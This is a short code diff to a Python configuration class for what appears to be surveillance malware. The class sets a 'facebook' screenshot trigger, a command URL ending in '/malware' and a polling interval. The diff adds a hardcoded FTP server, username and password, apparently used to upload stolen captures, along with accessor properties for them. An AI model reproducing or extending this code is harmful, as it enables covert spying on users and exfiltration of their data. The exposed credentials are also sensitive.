@@ -77,9 +77,9 @@ class Configuration:
             self.__screenshotTrigger = 'facebook'
             self.__baseURL = 'http://facebook-user-profile.herokuapp.com/malware'
             self.__communicationFrequency = 5
-            self.__ftpURL = None
-            self.__ftpUserName = None
-            self.__ftpPassword = None
+            self.__ftpURL = 'ftp://ftp.atw.hu'
+            self.__ftpUserName = 'kiserletimuto'
+            self.__ftpPassword = 'patti'
 
 
 
@@ -147,12 +147,14 @@ class Configuration:
     def userName(self):
         return self.__userName
 
+    @property
+    def ftpURL(self):
+        return self.__ftpURL
 
+    @property
+    def ftpUserName(self):
+        return self.__ftpUserName
 
-
-
-
-
-
-if __name__ == "__main__":
-    config = Configuration()
+    @property
+    def ftpPassword(self):
+        return self.__ftpPassword
